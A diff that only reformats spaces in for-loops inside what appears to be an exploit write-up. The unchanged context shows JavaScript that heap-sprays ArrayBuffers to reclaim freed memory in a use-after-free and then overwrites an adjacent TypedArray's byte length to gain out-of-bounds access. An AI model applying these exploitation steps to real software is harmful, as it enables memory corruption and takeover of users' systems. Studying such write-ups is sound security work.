@@ -263,12 +263,12 @@ Size: 0x400                 Size: 0x400                  Size: 0x400            
 
 ```JavaScript
     // reclaims the memory, like your typical use after free
-    for(var i1 = 1;i1 < 0x40; i1++){
+    for(var i1 = 1; i1 < 0x40; i1++){
         sprayarr2[i1] = new ArrayBuffer(0x20000-24);
     }
 
     // look for the TypedArray that is 0x20000 in size
-    for(var i1 = 1;i1 < spraynum; i1++){
+    for(var i1 = 1; i1 < spraynum; i1++){
         if( sprayarr[i1].byteLength == 0x20000-24){
             
             // This is the magic, overwrite the next TypedArray's byte length
@@ -294,7 +294,7 @@ Size: 0x400                 Size: 0x400                  Size: 0x400            
             var arr = new Array(0x10000);
             for(var i2 = 0x10; i2 < 0x10000; i2++)
                 arr[i2] = new Uint32Array(1);
-            for(var i2 = 1;i2<0x10;i2++){
+            for(var i2 = 1; i2 < 0x10; i2++){
                 arr[i2] = new Uint32Array(sprayarr[i+i2]);
 
                 // set the index into the first element of the TypedArray
